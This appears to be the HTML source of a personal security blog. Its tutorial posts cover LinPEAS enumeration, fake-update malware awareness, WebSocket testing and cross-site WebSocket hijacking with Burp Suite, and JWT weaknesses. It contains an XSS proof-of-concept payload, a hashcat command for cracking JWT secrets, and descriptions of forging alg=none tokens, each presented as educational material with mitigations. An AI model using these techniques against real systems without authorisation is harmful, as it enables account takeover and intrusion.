            -p [PORT(s)] -d [IP/NETMASK] Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
            -i [IP] [-p [PORT(s)]] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
             Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed

        Port forwarding (reverse connection):
            -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT Execute linpeas to forward a port from a your host (LOCAL_IP:LOCAL_PORT) to a remote IP (REMOTE_IP:REMOTE_PORT)

        Firmware recon:
            -f [/FOLDER/PATH] Execute linpeas to search passwords/file permissions misconfigs inside a folder

        Misc:
            -h To show this message
            -w Wait execution between big blocks of checks
            -L Force linpeas execution
            -M Force macpeas execution
            -q Do not show banner
            -N Do not use colours

            </div>
        </div>

        <p>let’s execute the script and redirect its output to a new file called linpeas_results.txt</p>
        
        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ bash linpeas.sh -a -N > linpeas_results.txt

. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
[SNIP]

kali@kali:~$ 

            
            </div>
        </div>

        <p>The results can then transferred back to our attacking machine, where we will analyze the results.</p>

        <h4> More Commands for enumeration:</h4>

        <p> Which sudo version is installed </p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ sudo -V
            </div>
        </div>

        <p>What is the release no. of Ubuntu running</p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ lsb_release -a
            </div>
        </div>


        </div>
    </div>

    <div id="post6" class="post" onclick="togglePost(this)">
        <h3>Think Before You Click (Security tips)</h3>
        <div class="post-content">
            <h4>A Click Can Cost You Everything</h4>
            <p>In today’s digital world, hackers don’t need brute force to break into your system, they just need you to click. One of the most common yet deceptive tricks used by cybercriminals is fake software updates or CAPTCHAs. These look exactly like legitimate update prompts from your system or browser, but in reality, they install malware, ransomware, or spyware on your device.</p>

            <p>Watch this short video to see the latest on this growing threat and how to protect yourself. <a class="link" href="https://tinyurl.com/2fraszxu" target="_blank">Youtube</a> important step to understanding this type of attack</p>

            <h4>How Fake Updates Work</h4>
            <p>Cybercriminals use social engineering tactics to make their fake update pop-ups look convincing. Here’s how they do it:</p>
            
            <ul>
                <li><strong>Mimicking Trusted Software</strong> – Attackers design fake update prompts that look identical to real Windows, macOS, or browser updates.</li>
                <li><strong>Urgency & Fear</strong> – Messages like “Your security is at risk!” create a sense of panic, pushing users to act quickly.</li>
                <li><strong>Malicious File Downloads</strong> – Clicking on these fake updates often leads to downloading malware that steals data, installs keyloggers, or takes control of your system.</li>
                <li><strong>Fake Progress Bars</strong> – To add legitimacy, attackers include fake download animations to make the update seem real.</li>
            </ul>

            <h4>Real Life Examples of Fake Update Attacks</h4>
            <ul>
                <li><strong>Fake Chrome & Edge Updates</strong> – Attackers send pop-ups urging users to “update their browser,” but instead, they deliver Trojans that steal sensitive data.</li>
                <li><strong>Windows Security Update Scams</strong> – Users are tricked into downloading a supposed “critical patch” that is actually ransomware.</li>
                <li><strong>Fake Flash Player Updates</strong> – Despite Flash being obsolete, hackers still use fake Flash updates to infect systems with spyware.</li>
            </ul>

            <h4>How to Protect Yourself</h4>
            <ul>
                <li><strong>Never Download Updates from Pop-Ups</strong> – Always update your system through official settings (Windows Update, macOS System Preferences, or software settings).</li>
                <li><strong>Verify Before Clicking</strong> – If an update notification appears, go to the official website and check for updates manually.</li>
                <li><strong>Look for HTTPS & Legitimate Domains</strong> – Never download software from third-party sites that aren’t officially linked to the provider.</li>
                <li><strong>Use Security Software</strong> – Enable antivirus programs and browser security warnings to detect malicious sites.</li>
            </ul>

            <h4>Final Thoughts: Stay Alert, Stay Safe</h4>
            <p>Cybercriminals rely on impulse clicks to spread malware. The next time you see an unexpected update prompt, <strong>pause and think before you click</strong>. Your digital security depends on it.</p>
        </div>
    </div>

    <div id="post7" class="post" onclick="togglePost(this)">
        <h3>WebSockets</h3>
        <div class="post-content">
            <h4>What is a WebSockets?</h4>
            <p>WebSockets are a modern communication protocol that facilitates full duplex, real time data exchange between a client (typically a web browser) and a server. Unlike traditional HTTP requests, which follow a request response model, WebSockets maintain an open connection, allowing both parties to send and receive data instantly over a single, persistent channel.</p>

            <p>WebSockets are widely used in modern web applications to facilitate real time communication, often transmitting sensitive data such as authentication tokens or user inputs. While WebSockets differ from traditional HTTP requests by maintaining a persistent, full duplex connection, many of the same security vulnerabilities such as cross-site WebSocket hijacking, sqli, XXE, SSRF, CSRF, insecure authentication, or lack of input validation can still occur if not properly mitigated.</p>
            

            <h4>Manipulating WebSocket traffic</h4>
            <ul>
                <li>Intercept and modify WebSocket messages.</li>
                <li>Replay and generate new WebSocket messages.</li>
                <li>Manipulate WebSocket connections.</li>
            </ul>

            <h4>Step</h4>
            <ul>
                <li>Open Burp's browser.</li>
                <li>Browse to the application function that uses WebSockets. You can determine that WebSockets are being used by using the application and looking for entries appearing in the WebSockets history tab within Burp Proxy.</li>
                <li>In the Intercept tab of Burp Proxy, ensure that interception is turned on.</li>
                <li>When a WebSocket message is sent from the browser or server, it will be displayed in the Intercept tab for you to view or modify. Press the Forward button to forward the message.</li>
            </ul>

            <h4>How to replay individual messages and generate new messages.</h4>
            <ul>
                <li>In Burp Proxy, select a message in the WebSockets history, or in the Intercept tab, and choose <strong>"Send to Repeater"</strong> from the context menu.</li>
                <li>In Burp Repeater, you can now edit the message that was selected, and send it repeatedly.</li>
                <li>You can enter a new message and send it in either direction, to the client or server.</li>
                <li>In the <strong>"History"</strong> panel within Burp Repeater, you can view the history of messages that have been transmitted over the WebSocket connection. This includes messages generated by you in Burp Repeater, as well as those sent by the browser or server over the same connection.</li>
                <li>If you want to edit and resend any message in the history panel, select the message and choose <strong>"Edit and resend"</strong> from the context menu.</li>
            </ul>

            <p>We can also manipulate the WebSocket handshake, which is responsible for establishing the connection. Capturing and modifying this handshake may be necessary to access a broader attack surface. Some attacks can cause the connection to drop, so it's important to be able to re-establish it as needed. Tokens or other sensitive data in the original handshake request may become stale and need to be refreshed for continued access or successful exploitation.</p>
            <img src="websockethandshake.png" alt="OSI Model Layers" style="width: 90%; height: 400px; border-radius: 10px;">

            <h4>Manipulate the WebSocket handshake using Burp Repeater</h4>
            <ul>
                <li>Send a WebSocket message to Burp Repeater as already described.</li>
                <li>In Burp Repeater, click on the pencil icon next to the WebSocket URL. This opens a wizard that lets you attach to an existing connected WebSocket, clone a connected WebSocket, or reconnect to a disconnected WebSocket.</li>
                <li>If you choose to clone a connected WebSocket or reconnect to a disconnected WebSocket, the wizard will display full details of the WebSocket handshake request. You can edit these details as needed before the handshake is executed.</li>
                <li>When you click "Connect", Burp will attempt to carry out the configured handshake and display the result. If a new WebSocket connection is successfully established, you can then use it to send new messages in Burp Repeater.</li>
            </ul>

            <h4>WebSockets security vulnerabilities</h4>
            <ul>
                <li>If user input sent over a WebSocket is processed insecurely by the server, it can lead to vulnerabilities such as SQL injection or XML External Entity (XXE) injection.</li>
                <li>Some vulnerabilities triggered through WebSockets may not provide immediate feedback, requiring out-of-band (OAST) techniques to detect them.</li>
                <li>If attacker-controlled data is transmitted via WebSockets to other users, it could lead to client-side vulnerabilities such as cross-site scripting (XSS).</li>
            </ul>
            
            <h4>collaborative whiteboard application (Example)</h4>
            <p>Suppose a collaborative whiteboard application uses WebSockets to send drawing actions from users' browsers to the server. When a user draws a shape, a WebSocket message like the following is sent:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
    
                <div class="terminal-body">
{"action":"draw","shape":"rectangle","color":"blue"}
                </div>
            </div>
            <p>The server then broadcasts this message to all connected clients, and the action is rendered in their browsers like this:</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
    
                <div class="terminal-body">
&lt;div class=&quot;shape&quot; data-shape=&quot;rectangle&quot; style=&quot;background-color: blue;&quot;&gt;&lt;/div&gt;
                </div>
            </div>
            <p>Now, if the server fails to validate or sanitize the incoming data, an attacker could exploit this by sending a malicious payload like:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
{"action":"draw","shape":"&lt;img src=x onerror='alert(1)'&gt;","color":"red"}
                </div>
            </div>
            <p>This could result in a client-side XSS vulnerability if the payload is rendered directly in the DOM.</p>

            <video controls style="width: 90%; height: 400px; border-radius: 10px;">
                <source src="websocketxss.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>

            <h4>Digging Deeper into WebSocket Vulnerabilities</h4>

            <p>Some of the trickiest WebSocket security issues don’t show up until you start messing with the initial handshake the part where the WebSocket connection is first set up. These aren’t your average bugs; they usually come from deeper design problems in how the app is built. Here’s what that looks like in practice:</p>
            <ul>
                <li><strong>Overtrusting HTTP headers:</strong> Some apps rely too heavily on headers like <strong>X-Forwarded-For</strong> to make security decisions, which can be spoofed or manipulated by an attacker. Not a good look.</li>
                <li><strong>Weak session handling:</strong> Since WebSocket communication is tied to the session from the initial handshake, any flaws in how that session is managed can create gaps for exploitation. If the handshake session isn’t locked down, neither is your WebSocket traffic.</li>
                <li><strong>Risky custom headers:</strong> Developers sometimes add their own HTTP headers for functionality but without proper validation, those custom headers can expose a bigger attack surface than expected.</li>
            </ul>


            <p>Some WebSocket security flaws happen when a hacker tricks your browser into connecting to a WebSocket server from a sketchy site they control. This kind of attack is called <strong>Cross-Site WebSocket Hijacking (CSWH)</strong>, and yeah, it’s as shady as it sounds.</p>

            <p>Here’s how it works: the attacker uses a vulnerability called <strong>CSRF (Cross-Site Request Forgery)</strong> during the WebSocket handshake. That’s basically the part where your browser says, “Hey, can I start chatting with this server?” If that handshake isn’t properly locked down, the attacker can piggyback off your session without your knowledge.</p>

            <p>The consequences? Pretty serious. They can:</p>

            <ul>
                <li>Act like <em>you</em> and perform privileged actions (like sending messages, making changes, etc.).</li>
                <li>Access sensitive info that’s only meant for your eyes.</li>
            </ul>

            <p>So even if you’re logged in and doing everything right, a poorly secured WebSocket handshake could let someone else ride your session like a free Uber.</p>
        
            <p>Imagine you’re logged into your favorite online app let’s say a student portal. It uses WebSockets to keep your data up to date in real time, like grades or messages. Now picture this: you visit a random website made by an attacker, and without you even knowing, that site secretly opens a connection to your student portal’s server using WebSockets.</p>

            <p>This kind of attack happens when the app uses only your browser’s cookies to check if you're logged in, without any extra security checks like CSRF tokens. Because of that, the server just assumes the connection is legit since your cookies are still valid.</p>

            <p>Here’s what the attacker can do with this trick:</p>

            <ul>
                <li>Set up their own fake site to quietly talk to the real WebSocket server while you're logged in.</li>
                <li>Send any messages they want to the server, pretending to be you.</li>
                <li>Actually receive responses back from the server yep, they get full two way access.</li>
            </ul>

            <p>This is worse than normal CSRF, where the attacker can only send requests. With this, they can also read what comes back, which could include your private messages, profile info, or anything else the app sends through WebSockets.</p>

            <p>Bottom line: if the app doesn’t use strong protection like CSRF tokens or custom headers during the handshake, it’s like letting someone else take over your group project messages without even logging in.</p>

            <p><strong>How These Attacks Actually Start</strong></p>

            <p>this kind of WebSocket attack basically works the same way as a classic CSRF vulnerability, just with a WebSocket twist. If you want to pull it off (or prevent it, if you're on the defense side), you first need to look at how the app kicks off its WebSocket connections — that’s called the handshake.</p>

            <p>Your goal is to check if those handshake requests are properly protected. In other words, is the app doing anything to make sure the request is really coming from the right user and not some sketchy site?</p>

            <p>Here’s what usually signals a weak spot:</p>

            <ul>
            <li>The handshake only uses browser cookies to know who you are.</li>
            <li>No CSRF tokens or other random values are added to the request to prove it came from the real site.</li>
            </ul>

            <p>If you see a WebSocket handshake that’s just running off cookies with no extra security checks, that’s a green light for attackers. They can trick a browser into starting that handshake from a totally different site, and the server won’t even notice the difference.</p>
        
            <p>Here’s an example of a WebSocket handshake request that looks vulnerable to a CSRF style attack. The only thing identifying the user is a session cookie — there are no extra tokens or custom headers that verify the request actually came from the real website:</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

GET /gradesocket HTTP/1.1
Host: studentportal.edu
Sec-WebSocket-Version: 13
Connection: keep-alive, Upgrade
Cookie: sessionid=Abc123SuperSecretSession
Upgrade: websocket

                </div>
            </div>
            

            <p>Notice how the session is handled just through the <code>sessionid</code> cookie. That’s risky — if a user visits a sketchy site while logged in, the attacker could hijack this handshake and interact with the server as if they were the user.</p>
            <p><strong>What Happens After a Successful WebSocket Hijack?</strong></p>

            <p>If the WebSocket handshake is open to CSRF, what the attacker does next really depends on how the app uses WebSockets. It’s all about what kind of features are exposed through that connection. Once they’re in, the attacker can do stuff like:</p>

            <ul>
            <li>Send fake WebSocket messages to act like the user  making changes, posting content, or triggering actions they shouldn't be able to.</li>
            <li>Ask for sensitive info through the WebSocket and read the responses  stuff like private messages, personal data, or account details.</li>
            <li>Just chill and wait  if the app sends real time updates over WebSockets, the attacker might not even need to do anything. They can just listen in and collect whatever comes through.</li>
            </ul>

            <p>In short, once the attacker slides into that connection, the damage depends on how much the app trusts whoever’s on the other end of the WebSocket.</p>
            
            <h4>Best Practices for Securing WebSocket Connections</h4>

            <p>WebSocket connections are super useful for building real-time features like chat apps, live notifications, or multiplayer games. But if you do not secure them properly, they can become a serious weakness. Here are some important tips that every developer or security student should follow when working with WebSocket technology:</p>

            <ul>
            <li><strong>Use wss instead of ws</strong> This ensures your WebSocket connection is encrypted using transport layer security, just like how HTTPS protects regular web traffic. It keeps your data safe from attackers who are monitoring the network.</li>

            <li><strong>Do not let users control the WebSocket URL</strong> Always set the WebSocket server address in your code. If users can change it or if the app builds it using user input, that could be used to launch attacks or connect to dangerous servers.</li>

            <li><strong>Protect the handshake with proper validation</strong> During the initial handshake, the app should check for a real token or some kind of unique value that proves the request is coming from your own site. Cookies alone are not enough.</li>

            <li><strong>Always validate data from the WebSocket</strong> Whether the message is coming from the client or the server, treat it as untrusted. Sanitize and validate everything to protect against injection attacks like cross-site scripting or database injections.</li>

            <li><strong>Make sure users are really authenticated</strong> Only allow WebSocket connections from users who are logged in with a valid session. You can use tokens that expire quickly to make this more secure and avoid session abuse.</li>

            <li><strong>Check the origin header on the server side</strong> Even though WebSockets do not follow the same origin policy like regular web requests, you can still inspect the origin during the handshake and block any requests that do not come from your domain.</li>

            <li><strong>Log everything related to WebSocket traffic</strong> Track who is connecting, what messages are being sent, and when. This can help you catch suspicious activity early and investigate if anything goes wrong.</li>
            </ul>

            <p>The main idea is simple. Do not treat WebSocket connections as safe by default. You should treat them like any other part of your application where data is coming and going. If you are writing code, testing security, or reviewing an app, always ask yourself how someone could abuse the connection and how you would stop them.</p>

            <p>Check my write-up for one of the challenges I solved using WebSockets here <a class="link" href="https://medium.com/@vgqxjb/websockfish-picoctf-19d73a8434dc" target="_blank">PicoCTF</a>.</p>
        
        </div>
    </div>

    <div id="post8" class="post" onclick="togglePost(this)">
        <h3>JSON Web Token attacks and vulnerabilities</h3>
        <div class="post-content">
            <p>JSON Web Tokens (JWTs) are a popular way to securely transmit data between systems using JSON format. They're commonly used for authorization, since they can be digitally signed making them verifiable and trustworthy when used properly. But if you mess up the implementation, they can become a serious security risk. This write-up breaks down the technical side of JWT vulnerabilities and common attack vectors.</p>

            <img src="jwt.png" alt="OSI Model Layers" style="width: 30%; height: 300px; border-radius: 10px;">
            <h4>What are JWTs?</h4>
            <p>Think of a JWT (JSON Web Token) as a secure ID card for your application. It’s a way for systems to send information back and forth, but in a format that’s encrypted and verified to prevent tampering. It’s like a way to prove that you are who you say you are without having to keep all the info on the server.</p>
            <h4>How it works?</h4>
            <p><strong>What it holds:</strong> A JWT can carry information about a user. For example, it might say, "This is user X, and they’re allowed to access these resources." It’s mostly used to handle authentication (proving you're logged in), sessions (keeping track of your login state), and access control (deciding which parts of the app you can use).</p>
            <p><strong>No need to store everything on the server:</strong> With traditional methods, servers would keep track of everything about a user's session. With JWTs, the data is stored in the token itself and sent with each request. This means less server load and no need to constantly query the database.</p>
            <p><strong>Why it’s great for distributed systems:</strong> If your app needs to talk to multiple servers (like in microservices), JWTs are perfect because they let each server independently verify the user's identity without needing to talk to each other.</p>

            <h4>JWT format</h4>
            <p>A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot.</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
                </div>
            </div>

            <p><strong>📘 Breakdown</strong></p>
            <p>1. Header (Base64-encoded JSON)</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

{
    "alg": "HS256",
    "typ": "JWT"
}
                </div>
            </div>
            <p>This says: "I'm a JWT and I use HMAC-SHA256 to sign."</p>
            <p>2. Payload (Base64-encoded JSON)</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

{
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239022
}
                </div>
            </div>
            <p>This is your claims set. sub is the subject (usually a user ID), name is a custom claim, and iat is the issue time.</p>
            <p>3. Signature</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    your-256-bit-secret
)                      
                </div>
            </div>
            <p>This ensures that the token hasn’t been tampered with. If the signature doesn’t match, the token is toast.</p>
            <p>Anyone who gets their hands on a JWT can decode and inspect its contents no special tools needed. That means the real line of defense isn’t hiding the data; it’s the cryptographic signature that ensures the token hasn’t been tampered with. Without verifying that signature, you’re basically trusting data that could’ve been forged in five seconds.</p>
            <h4>🧠 JWT Signature</h4>
            <p>When a server generates a JWT, it creates a signature by cryptographically hashing the token's header and payload using a secret signing key. This key is known only to the server and is essential to maintaining the token’s integrity.</p>
            <p>The signature acts as a tamper evident seal. Since it’s directly derived from the content of the header and payload, even the slightest change like altering a single character will produce a completely different signature. As a result, the token will fail verification.</p>
            <p>Without access to the server’s secret signing key, it’s computationally infeasible to generate a valid signature for a modified token. This is what makes the signature the cornerstone of trust in any JWT-based system.</p>

            <h4>What is the impact of JWT attacks?</h4>
            <p>If an attacker is able to forge a valid JWT, they gain the ability to:</p>
            <ul>
                <li><strong>Escalate Privileges:</strong> The attacker can modify the payload to elevate their own access level, potentially gaining administrative or elevated user rights within the system.</li>
                <li><strong>Impersonate Users:</strong> By tampering with the payload, the attacker could impersonate legitimate users, gaining unauthorized access to their accounts, and performing actions as if they were that user.</li>
                <li><strong>Take Full Control of Accounts:</strong> In the worst case scenario, the attacker can fully compromise a user’s account by forging a token that grants them complete control, bypassing authentication mechanisms altogether.</li>
            </ul>
            <h3>How do vulnerabilities to JWT attacks arise?</h3>
            <h4>1. Insecure or Weak Secret Key</h4>
            <ul>
            <li><strong>Explanation:</strong> If the secret key used to sign the JWT is weak, easily guessable, or hardcoded, attackers can brute-force or guess it to generate their own valid signatures.</li>
            <li><strong>How it Happens:</strong> Using weak keys like common phrases, predictable strings, or small-sized keys makes the token signing process vulnerable to attacks.</li>
            <li><strong>Mitigation:</strong> Use long, random, and complex keys stored securely (e.g., environment variables, hardware security modules).</li>
            </ul>

            <h4>2. Incorrect or Missing Signature Verification</h4>
            <ul>
            <li><strong>Explanation:</strong> Failure to properly validate the JWT's signature is a critical mistake. If the server does not verify the signature before trusting the data, attackers can alter the payload and still be accepted as valid.</li>
            <li><strong>How it Happens:</strong> If signature verification is disabled or incorrectly implemented (e.g., using `alg=none`), attackers can tamper with the token without being detected.</li>
            <li><strong>Mitigation:</strong> Always verify the signature using the server’s secret key, and never trust tokens that don’t pass this check.</li>
            </ul>

            <h4>3. Using `alg=none` (Algorithm None)</h4>
            <ul>
            <li><strong>Explanation:</strong> If the JWT algorithm is set to `none`, the token is not signed at all, making it possible for an attacker to modify the payload without any signature verification.</li>
            <li><strong>How it Happens:</strong> Some JWT libraries might default to `alg=none` if the algorithm is not specified, which can be exploited if not properly configured.</li>
            <li><strong>Mitigation:</strong> Explicitly set a secure signing algorithm (e.g., `HS256` or `RS256`) and ensure that the server rejects tokens with `alg=none`.</li>
            </ul>

            <h4>4. JWT Expiration (`exp`) Not Set</h4>
            <ul>
            <li><strong>Explanation:</strong> Without an expiration time, JWTs can be valid indefinitely, giving attackers unlimited time to exploit a compromised token.</li>
            <li><strong>How it Happens:</strong> Tokens without an expiration (`exp` claim) don’t expire, allowing attackers to reuse them even after a prolonged period.</li>
            <li><strong>Mitigation:</strong> Always set a reasonable expiration time for tokens, and ensure the server rejects expired tokens.</li>
            </ul>

            <h4>5. Token Storage Vulnerabilities</h4>
            <ul>
            <li><strong>Explanation:</strong> Storing JWTs in insecure locations (e.g., local storage or session storage in the browser) increases the risk of cross-site scripting (XSS) attacks or other client-side vulnerabilities that could allow an attacker to steal tokens.</li>
            <li><strong>How it Happens:</strong> Storing tokens in places that are easily accessible to client-side JavaScript or in cookies without proper flags (like `HttpOnly` and `Secure`) exposes them to theft.</li>
            <li><strong>Mitigation:</strong> Store JWTs securely, ideally in HTTP-only, Secure cookies, or use secure storage mechanisms that protect tokens from XSS.</li>
            </ul>

            <h4>6. Token Leakage Over Insecure Channels</h4>
            <ul>
            <li><strong>Explanation:</strong> If JWTs are transmitted over an insecure channel (like HTTP instead of HTTPS), they can be intercepted by attackers in a **man-in-the-middle (MITM)** attack.</li>
            <li><strong>How it Happens:</strong> Sending tokens over HTTP rather than HTTPS allows attackers to sniff the traffic and steal tokens.</li>
            <li><strong>Mitigation:</strong> Always use HTTPS to encrypt communication between the client and server, protecting JWTs from being intercepted.</li>
            </ul>

            <h4>7. JWT Claims Misuse</h4>
            <ul>
            <li><strong>Explanation:</strong> The claims within the payload, such as `sub` (subject) or `role`, should not be trusted as the sole indicator of the user’s privileges without verifying them against the server's data.</li>
            <li><strong>How it Happens:</strong> If an attacker can modify the payload (e.g., change the `role` claim to `admin`), the server may wrongly grant them higher privileges.</li>
            <li><strong>Mitigation:</strong> Always verify claims against server-side data to ensure they haven’t been tampered with.</li>
            </ul>

            <h4>8. Lack of Audience or Issuer Verification</h4>
            <ul>
            <li><strong>Explanation:</strong> Not verifying the `aud` (audience) and `iss` (issuer) claims makes it easier for attackers to forge tokens with arbitrary data.</li>
            <li><strong>How it Happens:</strong> Some systems may only validate the signature and ignore these claims, which opens the door for attackers to impersonate other systems or users.</li>
            <li><strong>Mitigation:</strong> Ensure proper validation of the `aud` and `iss` claims to confirm that the token is intended for your application and comes from a trusted source.</li>
            </ul>
            <h4>Exploiting Weaknesses in JWT Signature Verification</h4>
            <p>Servers, by default, do not retain any information about the JWTs they generate. Each token is designed to be self-contained, carrying all the necessary data within itself. While this design provides benefits, it also introduces a critical issue: the server has no knowledge of the original token's content or its signature. As a result, if the server fails to properly verify the token’s signature, an attacker could easily manipulate the contents of the token without being detected.</p>
            <p>For Example:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

{
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239022,
    "isAdmin": false
}                   
                </div>
            </div>
            <p>If the server uses the name to track sessions, changing this value could allow an attacker to impersonate other users who are currently logged in. Likewise, if the isAdmin flag is used to control access, an attacker could exploit this to escalate their privileges and gain unauthorized admin rights.</p>
            <p>JWT libraries usually offer two separate functions: one for verifying the token's authenticity and another for simply decoding its contents. For example, in the Node.js library jsonwebtoken, there’s verify() to validate the token and decode() to read its data without checking the signature.</p>
            <p>Sometimes, developers mistakenly use the decode() method instead of verify(), which means the application never checks the token’s signature. As a result, it essentially trusts any token, even if it’s been tampered with.</p>
            <h4>Accepting Tokens Without a Signature</h4>
            <p>JWT tokens contain a header that includes an alg parameter, which specifies the algorithm used to sign the token. This tells the server which algorithm it should use to verify the token's signature.</p>
            <h3>Example JWT header:</h3>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

{
    "alg": "HS256",
    "typ": "JWT"
}                  
                </div>
            </div>
            <p>The issue arises because the server relies on the alg parameter to determine how to validate the token. If the alg parameter is manipulated, the server could end up trusting a token that hasn't been properly verified. Essentially, an attacker can influence how the server determines whether a token is valid, potentially tricking it into accepting an unsigned or improperly signed token.</p>
            <p>While JWTs can be signed with various algorithms, they can also be created without a signature at all, leading to an "unsecured JWT." In this case, the alg is set to none, meaning no signature is used to validate the token. Although servers should reject tokens that lack a signature due to the obvious security risks, attackers can sometimes bypass these checks by using simple obfuscation techniques, such as changing capitalization or using different encodings. This makes it difficult for the server to identify and filter out unsecured JWTs.</p>
            <h4>Brute-forcing</h4>
            <p>Certain signing algorithms, like HS256 (HMAC + SHA-256), rely on a standalone, arbitrary string as the secret key. This key acts similarly to a password, and it’s essential that it’s not easily guessable or susceptible to brute-force attacks. If an attacker manages to figure out this secret, they can generate their own JWTs with any combination of header and payload, then re sign them with a valid signature using the secret.</p>
            <p>When building JWT based applications, developers can sometimes make critical mistakes, such as forgetting to update default or placeholder secrets. They might even copy code examples from online sources without changing the hardcoded secret included in those snippets. If this happens, it can be relatively easy for an attacker to brute-force the server's secret and gain the ability to create valid JWTs.</p>
            <p>hashcat can be used to brute-force secret keys.</p>
            <h4>How Hashcat Can Be Used to Brute-Force JWT Secret Keys:</h4>
            <ul>
            <li><strong>JWT Signing Algorithm (e.g., HS256):</strong> In the case of the HS256 algorithm (HMAC + SHA-256), the secret key is used to sign the JWT. If an attacker knows the structure of the JWT (the header and payload) but does not have the secret, they can use tools like Hashcat to attempt to guess the secret key.</li>
            <li><strong>Brute-Force Attack:</strong> With Hashcat, an attacker can use brute-force techniques to try all possible combinations of a secret key. This would involve testing different strings against the hash to see if they generate the correct signature for a given JWT. The process typically involves extracting the JWT signature and comparing it against various possible combinations of secret keys until a match is found.</li>
            <li><strong>Attack Modes:</strong> Hashcat supports various attack modes like dictionary, brute-force, hybrid, and rule-based attacks, which can be tailored to fit different scenarios and hash types.</li>
            <li><strong>Use of Wordlists:</strong> If an attacker has some idea about the structure of the secret (e.g., it could be a common word or phrase), they can use a wordlist attack to try common passwords or phrases.</li>
            <li><strong>Distributed Cracking:</strong> Hashcat supports distributed cracking, which can significantly speed up the brute-force process by using multiple GPUs or systems to share the workload.</li>
            <li><strong>Example Scenario:</strong> If a developer leaves the secret key in the code or uses a weak key (e.g., "password123"), an attacker could use Hashcat to try these simple or default keys quickly, leading to the compromise of the JWT and any associated accounts or systems.</li>
            </ul>

            <h3>Requirements</h3>
            <p><strong>1: </strong>You need a valid, signed JWT from the target server</p>
            <p><strong>2: </strong>Wordlist of well-known secrets</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
hashcat -a 0 -m 16500 jwt wordlist               
                </div>
            </div>
            <p>Hashcat takes the JWT's header and payload, then signs them using each secret from the wordlist. It compares the generated signature with the original signature from the server. If a match is found, Hashcat displays the discovered secret, along with additional relevant details, in the following format:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
jwt:identified-secret              
                </div>
            </div>
            <p>Once you have identified the secret key, you can use it to generate a valid signature for any JWT header and payload that you like. </p>
            <h4>Burp Suite:</h4>
            <h4>Modifying JWTs</h4>
            <ul>
                <li>Right-click the request containing the JWT and select <strong>Send to Repeater</strong>.</li>
                <li>In the request panel, navigate to the <strong>JSON Web Token</strong> tab.</li>
                <li>Modify the JSON data as needed in the <strong>Header</strong> and <strong>Payload</strong> sections.</li>
                <li>Click <strong>Sign</strong>. A new dialog will appear.</li>
                <li>In the dialog, choose the correct signing key and click <strong>OK</strong>. The JWT will be re-signed to reflect the updated header and payload values. If you haven’t added a signing key yet, follow the steps below.</li>
            </ul>

            <h4>Adding a JWT Signing Key</h4>
            <ul>
            <li>Go to the <strong>JWT Editor Keys</strong> tab.</li>
